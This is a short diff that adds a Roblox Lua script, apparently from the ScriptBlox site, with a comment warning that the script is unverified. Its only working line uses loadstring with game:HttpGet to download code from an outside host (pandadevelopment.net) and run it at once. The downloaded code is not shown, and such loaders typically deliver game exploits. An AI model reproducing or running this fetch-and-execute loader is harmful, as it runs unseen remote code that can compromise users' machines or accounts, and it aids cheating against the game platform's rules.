@@ -1,0 +1,4 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f3468d87bd0b8924"))()
